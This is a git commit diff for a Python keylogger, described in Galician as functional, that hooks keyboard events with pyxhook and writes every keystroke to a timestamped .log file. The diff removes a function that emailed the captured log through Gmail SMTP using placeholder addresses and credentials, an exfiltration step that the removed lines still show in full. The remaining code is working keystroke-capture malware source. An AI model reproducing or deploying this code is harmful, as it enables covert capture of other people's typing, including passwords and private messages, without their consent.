86035f047c9e4fe39c39df19b12b9e2898bc0233
VulcanoGal <martinrodriguezsalgueiro@gmail.com>
2022-04-17 15:04:02 +0200

    Base
    Keylogger funcional, crea archivos .log visibles que conteñen un rexistro de todo o escrito por teclado

--- main.py
+++ main.py
@@ -1,22 +1,5 @@
-import pyxhook, smtplib, os
+import pyxhook, os
 from datetime import datetime
-
-
-def send_email(archivo):
-    try:
-        fromaddr = "correoorigen@correo.com"
-        toaddr = "correodest@correo.com"
-        email_username = "usuariologin"
-        email_password = "contraseñalogin"
-        #Datos para enviar el correo
-        server = smtplib.SMTP('smtp.gmail.com:587')
-        server.starttls()
-        server.login(email_username,email_password)
-        server.sendmail(fromaddr, toaddr, archivo)
-        server.quit()
-      
-    except:
-        pass
 
 def main():
     archivo_log = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
@@ -29,17 +12,17 @@ def main():
                 x.write(f"{chr(event.Ascii)}")
 
     
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = PresionarTecla
-    new_hook.HookKeyboard()
+    key_logger = pyxhook.HookManager()
+    key_logger.KeyDown = PresionarTecla
+    key_logger.HookKeyboard()
 
     try:
-        new_hook.start()
+        key_logger.start()
     except KeyboardInterrupt:
-        new_hook.cancel()
+        key_logger.cancel()
         pass
     except Exception as problema:
-        txt = f"Error while catching events:\n {problema}"
+        txt = f"No se pudo registrar el caracter:\n {problema}"
         with open(archivo_log, "a") as x:
             x.write(f"\n{txt}")
 
